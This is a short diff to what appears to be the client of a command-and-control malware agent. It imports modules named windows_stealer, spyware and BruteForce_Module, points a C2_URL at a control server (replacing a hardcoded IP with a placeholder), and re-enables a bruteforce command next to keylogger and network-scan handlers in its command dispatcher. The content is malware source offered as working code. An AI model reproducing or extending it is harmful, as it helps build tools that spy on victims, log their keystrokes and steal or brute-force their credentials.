@@ -15,8 +15,8 @@ import windows_stealer as wsl
 import spyware as spy
 import BruteForce_Module as bf
 
-# C2_URL = "http://10.10.135.88:5000"
-C2_URL = "http://127.0.0.1:5000"
+C2_URL = "your_c2_server_url"
+# C2_URL = "http://127.0.0.1:5000"
 WHOAMI = subprocess.getoutput("whoami")
 SEMAPHORE = threading.Semaphore(7)
 
@@ -100,9 +100,9 @@ def run_command(cmd, sent_at):
                     output = ps.main()
                 elif cmd == "net_scan":
                     output = ns.AccurateScanner().run()
-                # elif cmd.startswith("bruteforce"):
-                #     parts = cmd.split()
-                #     output = bf.main(*parts[1:])
+                elif cmd.startswith("bruteforce"):
+                    parts = cmd.split()
+                    output = bf.main(*parts[1:])
                 elif cmd.startswith("keylogger"):
                     parts = cmd.split()
                     output = kl.main(*parts[1:])
